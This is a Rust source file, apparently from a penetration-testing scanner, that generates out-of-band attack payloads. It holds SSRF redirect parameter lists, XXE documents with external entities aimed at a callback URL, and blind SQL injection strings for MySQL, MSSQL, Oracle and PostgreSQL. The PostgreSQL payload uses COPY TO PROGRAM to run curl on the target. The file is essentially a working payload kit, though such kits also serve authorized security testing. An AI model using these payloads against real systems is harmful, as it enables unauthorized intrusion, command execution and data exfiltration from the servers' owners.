//! OOB payload generators for SSRF, XXE, and blind SQLi

/// Generates SSRF payloads using HTTP callback URL
pub fn ssrf_payloads(callback_url: &str) -> Vec<(String, String)> {
    let params = vec![
        "url", "redirect", "next", "dest", "destination", "callback",
        "return", "return_url", "redirect_uri", "continue", "target",
        "rurl", "go", "link", "feed", "host", "site", "html",
    ];

    params
        .into_iter()
        .map(|param| (param.to_string(), callback_url.to_string()))
        .collect()
}

/// Generates XXE payloads using HTTP/DNS callback
pub fn xxe_payloads(callback_url: &str) -> Vec<String> {
    vec![
        // Standard XXE with external entity
        format!(
            r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{}">]><foo>&xxe;</foo>"#,
            callback_url
        ),
        // Parameter entity XXE
        format!(
            r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{}">%xxe;]><foo>test</foo>"#,
            callback_url
        ),
        // XXE via SVG
        format!(
            r#"<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><text><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{}">]>&xxe;</text></svg>"#,
            callback_url
        ),
    ]
}

/// Generates blind SQL injection OOB payloads
pub fn sqli_oob_payloads(callback_url: &str, callback_dns: &str) -> Vec<(String, String)> {
    vec![
        // MySQL LOAD_FILE
        (
            "MySQL OOB".to_string(),
            format!("' AND LOAD_FILE('{}')-- -", callback_url),
        ),
        // MSSQL xp_dirtree
        (
            "MSSQL OOB".to_string(),
            format!(
                "'; EXEC master..xp_dirtree '\\\\{}\\test'-- -",
                callback_dns
            ),
        ),
        // Oracle UTL_HTTP
        (
            "Oracle OOB".to_string(),
            format!(
                "' || UTL_HTTP.REQUEST('{}') || '",
                callback_url
            ),
        ),
        // PostgreSQL COPY
        (
            "PostgreSQL OOB".to_string(),
            format!(
                "'; COPY (SELECT '') TO PROGRAM 'curl {}'-- -",
                callback_url
            ),
        ),
    ]
}
